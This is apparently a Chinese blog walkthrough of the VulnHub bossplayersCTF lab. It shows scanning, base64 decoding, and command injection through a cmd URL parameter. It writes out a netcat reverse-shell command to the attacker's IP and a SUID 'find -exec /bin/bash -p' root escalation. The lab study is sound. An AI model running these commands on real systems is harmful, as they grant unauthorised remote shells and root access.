+++
date = '2026-11-24T18:45:13+08:00'
draft = false
title = '[VulnHub靶机]bossplayersCTF渗透记录'
tags = ['渗透','Vulnhub']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 192.168.58.51  
靶机IP: 192.168.58.44

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.58.51
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.58.44   08:00:27:1a:40:a3       PCS Systemtechnik GmbH
192.168.58.190  66:60:15:aa:44:28       (Unknown: locally administered)
192.168.58.202  d0:65:78:4c:15:bc       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.58.44
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-24 18:51 +0800
Nmap scan report for 192.168.58.44
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1A:40:A3 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ sudo nmap -sT -sV -sC -O -p 22,80 192.168.58.44 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-24 18:51 +0800
Nmap scan report for 192.168.58.44
Host is up (0.0015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e (RSA)
|   256 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d (ECDSA)
|_  256 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:1A:40:A3 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (95%), OpenWrt 19.07 (Linux 4.14) (94%), Linux 2.6.32 (94%), Linux 4.15 (94%), Linux 5.14 - 6.8 (94%), OpenWrt 21.02 (Linux 5.4) (94%), Linux 6.6 (94%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (94%), Linux 4.15 - 5.19 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
```

漏洞扫描, 发现Web服务存在logs.php和robots.txt

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ sudo nmap --script=vuln -p22,80 192.168.58.44  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-24 18:52 +0800
Nmap scan report for 192.168.58.44
Host is up (0.00033s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /logs.php: Logs
|_  /robots.txt: Robots file
MAC Address: 08:00:27:1A:40:A3 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 31.48 seconds
```

## Web渗透

浏览器访问80端口

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/bossplayersCTF/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

主页源码, 发现底部存在base64字符串

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/bossplayersCTF/%E4%B8%BB%E9%A1%B5%E6%BA%90%E7%A0%81%E5%8F%91%E7%8E%B0base64.avif)

解码, 发现是多重base64编码, 最终得到workinginprogress.php

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d
ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K

┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ echo ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K | base64 -d                
d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==
                                                                                                                                           
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ echo d29ya2luZ2lucHJvZ3Jlc3MucGhwCg== | base64 -d            
workinginprogress.php
```

访问robots.txt, 发现base64字符串

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/bossplayersCTF/robots.avif)

解码

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ echo bG9sIHRyeSBoYXJkZXIgYnJvCg== | base64 -d   
lol try harder bro
```


访问/logs.php, 发现是系统启动日志

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]                                                                                          18:56 [321/418]
└─$ curl http://192.168.58.44/logs.php                                                                                                     
Sep 28 08:48:59 bossplayers kernel: [    0.002285] e820: update [mem 0x00000000-0x00000fff] usable ==> reserved                            
Sep 28 08:48:59 bossplayers kernel: [    0.002287] e820: remove [mem 0x000a0000-0x000fffff] usable                                         
Sep 28 08:48:59 bossplayers kernel: [    0.002297] MTRR default type: uncachable                                 
Sep 28 08:48:59 bossplayers kernel: [    0.002298] MTRR variable ranges disabled:                                                          
Sep 28 08:48:59 bossplayers kernel: [    0.079967] BRK [0x25401000, 0x25401fff] PGTABLE                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.079970] BRK [0x25402000, 0x25402fff] PGTABLE                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.079970] BRK [0x25403000, 0x25403fff] PGTABLE                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.079981] BRK [0x25404000, 0x25404fff] PGTABLE                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.079982] BRK [0x25405000, 0x25405fff] PGTABLE                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.080007] BRK [0x25406000, 0x25406fff] PGTABLE                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.080064] ACPI: Local APIC address 0xfee00000                                                     
Sep 28 08:48:59 bossplayers kernel: [    0.080258] On node 0 totalpages: 524174                                                            
Sep 28 08:48:59 bossplayers kernel: [    0.080259]   DMA zone: 64 pages used for memmap                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.080259]   DMA zone: 21 pages reserved                                                           
Sep 28 08:48:59 bossplayers kernel: [    0.080260]   DMA zone: 3998 pages, LIFO batch:0                                                    
Sep 28 08:48:59 bossplayers kernel: [    0.080318]   DMA32 zone: 8128 pages used for memmap                                                
Sep 28 08:48:59 bossplayers kernel: [    0.080318]   DMA32 zone: 520176 pages, LIFO batch:63                                               
Sep 28 08:48:59 bossplayers kernel: [    0.088074] ACPI: Local APIC address 0xfee00000                                                     
Sep 28 08:48:59 bossplayers kernel: [    0.088120] ACPI: IRQ0 used by override.                                                            
Sep 28 08:48:59 bossplayers kernel: [    0.088121] ACPI: IRQ9 used by override.                                                            
Sep 28 08:48:59 bossplayers kernel: [    0.162349] pcpu-alloc: s144408 r8192 d31720 u2097152 alloc=1*2097152                               
Sep 28 08:48:59 bossplayers kernel: [    0.162350] pcpu-alloc: [0] 0 
Sep 28 08:48:59 bossplayers kernel: [    0.164851] Calgary: detecting Calgary via BIOS EBDA area
Sep 28 08:48:59 bossplayers kernel: [    0.164852] Calgary: Unable to locate Rio Grande table in EBDA - bailing!
Sep 28 08:48:59 bossplayers kernel: [    0.209194] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
Sep 28 08:48:59 bossplayers kernel: [    0.209529] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
Sep 28 08:48:59 bossplayers kernel: [    0.210044] pci 0000:00:01.1: [8086:7111] type 00 class 0x01018a
Sep 28 08:48:59 bossplayers kernel: [    0.210304] pci 0000:00:01.1: reg 0x20: [io  0xd000-0xd00f]
Sep 28 08:48:59 bossplayers kernel: [    0.210538] pci 0000:00:02.0: [15ad:0405] type 00 class 0x030000
Sep 28 08:48:59 bossplayers kernel: [    0.211583] pci 0000:00:02.0: reg 0x10: [io  0xd010-0xd01f]
```

访问/workinginprogress.php, 返回了系统的信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/bossplayersCTF/%E8%AE%BF%E9%97%AEworkinginprogress.avif)

注意到"Test ping command - [ ]", 这意味着服务器或许可以执行命令  
尝试给当前URL加上`?cmd=whoami`, 果然返回了当前用户名, 成功RCE

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/bossplayersCTF/RCE.avif)

攻击机开启监听, 访问`http://192.168.58.44/workinginprogress.php?cmd=nc 192.168.58.51 4444 -e /bin/bash`即可获得shell

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.58.51] from (UNKNOWN) [192.168.58.44] 56130
ls
index.html
logs.php
robots.txt
workinginprogress.php
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 权限提升

终端升级

```shell
python -c "import pty;pty.spawn('/bin/bash')"
www-data@bossplayers:/var/www/html$
```

在/var中发现backups文件夹, 里面有shadow和passwd的备份, 但我们没有权限读取

```shell
www-data@bossplayers:/var$ ls -lah backups
total 556K
drwxr-xr-x  2 root root   4.0K Nov 24 21:54 .
drwxr-xr-x 12 root root   4.0K Sep 28  2019 ..
-rw-r--r--  1 root root    40K Sep 28  2019 alternatives.tar.0
-rw-r--r--  1 root root    11K Sep 28  2019 apt.extended_states.0
-rw-r--r--  1 root root    186 Sep 28  2019 dpkg.diversions.0
-rw-r--r--  1 root root    126 Sep 28  2019 dpkg.diversions.1.gz
-rw-r--r--  1 root root    172 Sep 28  2019 dpkg.statoverride.0
-rw-r--r--  1 root root    142 Sep 28  2019 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   363K Sep 28  2019 dpkg.status.0
-rw-r--r--  1 root root    99K Sep 28  2019 dpkg.status.1.gz
-rw-------  1 root root    767 Sep 28  2019 group.bak
-rw-------  1 root shadow  647 Sep 28  2019 gshadow.bak
-rw-------  1 root root   1.5K Sep 28  2019 passwd.bak
-rw-------  1 root shadow  975 Sep 28  2019 shadow.bak
```

查找所有具有SUID位的文件, 注意到find

```shell
www-data@bossplayers:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/grep
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/find
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

查看find权限

```shell
www-data@bossplayers:/home$ ls -lhd /usr/bin/find
-rwsr-sr-x 1 root root 309K Feb 16  2019 /usr/bin/find
```

使用find提权

```shell
www-data@bossplayers:/home$ find . -exec /bin/bash -p \;
bash-5.0# whoami
root
```

读取flag, 依旧是base64编码

```shell
bash-5.0# cd /root;ls -lah
total 24K
drwx------  2 root root 4.0K Sep 28  2019 .
drwxr-xr-x 18 root root 4.0K Sep 28  2019 ..
-rw-------  1 root root  929 Sep 28  2019 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
-rw-r--r--  1 root root   25 Sep 28  2019 root.txt
bash-5.0# cat root.txt
Y29uZ3JhdHVsYXRpb25zCg==
```

解码得到`congratulations`

```shell
┌──(kali㉿kali)-[~/bossplayersCTF]
└─$ echo Y29uZ3JhdHVsYXRpb25zCg== | base64 -d
congratulations
```
